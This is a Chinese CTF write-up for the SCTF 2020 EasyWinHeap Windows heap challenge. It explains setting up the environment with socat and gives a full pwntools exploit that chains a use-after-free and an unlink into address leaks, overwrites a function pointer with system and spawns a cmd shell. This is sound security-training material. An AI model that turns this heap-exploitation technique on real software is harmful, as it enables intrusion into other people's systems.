---
title: SCTF 2020 EasyWinHeap 入门 Windows Pwn
date: 2020-07-09 00:00:00
categories:
- CTF/Pwn
tags: 
---

> 通过本文可以了解到：1.一种在Win下搭建Pwn题环境的方法（socat+pwntools+IDA） 2. Windows用户态程序运行的基本原理与win下一些实用工具 3.Windows堆管理的基本方法。本题的漏洞点是存在悬空指针可以UAF，而且对于该悬空指针可以继续show、edit、free。利用方式为通过UAFleak堆地址，然后通过unlink完成堆上的节点索引的改写进而继续leak出程序基址，进而继续改写堆上的索引节点leak出ucrt的基址，最后继续修改索引节点的函数指针为system并控制参数为cmd即可getshell。

- 题目附件：[sctf_EasyWinHeap.zip](https://xuanxuanblingbling.github.io/assets/attachment/stm32/sctf_EasyWinHeap.zip)
- 运行环境：`Win7 sp1`虚拟机，因为没有用win10，也就没有win10的terminal，所以还是采用[cmder](https://cmder.net/)为本地的终端工具。

## 环境搭建

不同于[winpwn: pwntools for Windows (mini)](https://github.com/byzero512/winpwn)，这里仍然采用pwntools来完成解题，pwntools是不支持本地直接启动windows进程的，所以本地采用socat直接架起来程序，相当于远程环境。

- [socat for windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/)
- [socat 1.7.3.2 for Windows](https://www.cybercircuits.co.nz/web/blog/socat-1-7-3-2-for-windows)
- [socat在Windows下的使用](https://juejin.im/post/5d8dd1b16fb9a04e1135dec5)

```c
socat tcp-listen:8888,fork EXEC:EasyWinHeap.exe,pipes &
```

## 工具

- 
- [socat for windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/)
- [socat 1.7.3.2 for Windows](https://www.cybercircuits.co.nz/web/blog/socat-1-7-3-2-for-windows)
- [socat在Windows下的使用](https://juejin.im/post/5d8dd1b16fb9a04e1135dec5)
- [winpwn: pwntools for Windows (mini)](https://github.com/byzero512/winpwn)

## exp

```python
from pwn import *
#context.log_level = 'debug'
ip = "10.10.10.137";port = 8888
io = remote(ip,port)

sla         = lambda delim,data           :  (io.sendlineafter(delim, data))
add         = lambda size           	  :  (sla("option >\r\n", '1'),sla("size >\r\n", str(size)))
show        = lambda index                :  (sla("option >\r\n", '3'),sla("index >\r\n", str(index)))
edit        = lambda index,data           :  (sla("option >\r\n", '4'),sla("index >\r\n", str(index)),sla("content  >\r\n", data))
free        = lambda index                :  (sla("option >\r\n", '2'),sla("index >\r\n", str(index)))
uu32        = lambda data                 :  u32(data.ljust(4, b'\0'))

# UAF to leak heap
while(1):
    add(32);add(32);add(32)                                         # free block0 or block1, the fd is point to the largest free chunk, it can success leak the heap_base
    free(1);show(1)                                                 # can't free block2 to leak heap_base, because it will merge to the largest free chunk. 
    heap_base = uu32(io.recvuntil("\r\n", drop=True)[:4])-0x630     # and the fd will point to heap_base+0x00c4, it contains NULL byte.
    if heap_base > 0x1000000 :                                      # if the heap_base less than 4 byte, the next step to leak image_base can't success
        break                                                       # because when we leak image_base, before the image_base is the heap_addr 
    io.close();io = remote(ip,port)

log.warn("heap_base:" + hex(heap_base))
list_addr = heap_base + 0x578
block0    = list_addr
block1    = list_addr + 8

# use unlink to make a loop and leak image_base
edit(1,p32(block1)+p32(block1+4))                                   # *(block1 + 4) = block1 + 4 , when show block1, it can leak data in list
add(32);show(1);                                                    # add(32) or free(0) both can trigger unlink
io.recv(4)                                                          # 4 byte heap_addr,if it's only 3 byte, it will be stop to print due to NULL byte
image_base = uu32(io.recvuntil("\r\n", drop=True)[:4])-0x1043
log.warn("image_base:" + hex(image_base))

# use loop to leak ucrt
puts_iat = image_base + 0x20c4
edit(1, p32(puts_iat)+p32(0)+p32(block0));show(1)                   # modify block2content point to block0
ucrt_base = u32(io.recv(4))-0xb89f0
log.warn("ucrt_base:" + hex(ucrt_base))
system = ucrt_base+0xefda0

# modify func pointer to system and tigger it
edit(0, 'cmd\x00')                                                  # normal write, add "cmd" to block0content
edit(2, p32(system)+p32(heap_base+0x600))                           # modify block0 func to system and repair block0content
show(0)                                                             # trigger system(cmd)
io.interactive()
```

## 参考

- [SCTF 2020 PWN](https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/)
- [Windows-pwn解题原理&利用手法详解](https://www.anquanke.com/post/id/188170#h3-8)
- [Windows Pwn 入门](https://ble55ing.github.io/2019/08/18/WindowsPwn1/)
- [Windows下32位进程内存模型](http://www.xumenger.com/01-windows-process-memory-20170101/)
- [SUCTF 2019 PWN](https://kirin-say.top/2019/08/19/SUCTF-2019-PWN/)
- [CTF中Windows下Pwn题的部署？](https://www.zhihu.com/question/286944913)
- [Windows pwn 的一些感悟](http://blog.eonew.cn/archives/1245)
- [xman 2017 Day 7:Windows pwn](https://www.xctf.org.cn/library/details/9d1cd32600eb05d13abe05bea120fc4c8b286019/)